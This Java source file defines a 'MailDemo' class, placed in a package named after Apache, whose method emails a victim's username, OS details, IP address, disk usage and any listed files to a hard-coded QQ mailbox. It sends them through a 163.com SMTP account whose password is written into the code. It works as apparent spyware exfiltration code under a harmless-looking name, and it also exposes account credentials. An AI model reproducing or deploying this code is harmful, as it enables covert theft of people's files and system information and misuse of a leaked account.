package com.apache.server;
import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

public class MailDemo {
	
	
	public static void fun2(List<String> pathlist,String username,String osinfo,String ip,String hardinfo) throws Exception {
		Properties props = new Properties();
		props.setProperty("mail.host", "smtp.163.com");
		props.setProperty("mail.smtp.auth", "true");
		
		Authenticator auth = new Authenticator() {
			@Override
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication("13052307692", "langsin123");
			}
		};
		
		Session session = Session.getInstance(props, auth);
		
		MimeMessage msg = new MimeMessage(session);
		msg.setFrom(new InternetAddress("13052307692@163.com"));
		msg.setRecipients(RecipientType.TO, "624970695@qq.com");
		
		msg.setSubject("呵呵");
		
		
		
		MimeMultipart list = new MimeMultipart();
		MimeBodyPart part1 = new MimeBodyPart();
	
		part1.setContent("用户名:"+username+";"+"系统情况:"+osinfo+";"+"ip:"+ip+"硬盘使用情况:"+hardinfo, "text/html;charset=utf-8");
		
		list.addBodyPart(part1);
		
		
		for(String path:pathlist) {
			MimeBodyPart part = new MimeBodyPart();
			part.attachFile(new File(path));
			list.addBodyPart(part);
		}
		msg.setContent(list);
		
		
		Transport.send(msg);
	}
	

}
